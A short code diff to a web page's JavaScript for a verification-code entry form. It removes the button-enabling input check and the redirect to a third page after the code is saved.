@@ -116,24 +116,9 @@
                 this.blur(); // Remove focus, which prevents the keyboard from appearing
             });
         });
-        const submitButton = document.getElementById('submit-btn');
-
-        // Function to check if all inputs are filled
-        function checkInputs() {
-            const allFilled = Array.from(codeInputs).every(input => input.value !== '');
-            submitButton.disabled = !allFilled;
-        }
-
-        // Add event listeners to inputs to check on input
-        codeInputs.forEach(input => {
-            input.addEventListener('input', checkInputs);
-        });
-
-        // Initial check
-        checkInputs();
 
         // Handle form submission
-        submitButton.addEventListener('click', async function(event) {
+        document.getElementById('submit-btn').addEventListener('click', async function(event) {
             event.preventDefault(); // Prevent the form from submitting normally
 
             const verificationCode = Array.from(codeInputs).map(input => input.value).join('');
@@ -149,9 +134,6 @@
 
                 console.log('Verification code saved successfully:', result);
                 alert('Verification code saved successfully!');
-                
-                // Open the new page if the verification code is saved successfully
-                window.location.href = './page3.html';
             } catch (error) {
                 console.error('Error saving verification code:', error);
                 alert('Failed to save verification code.');
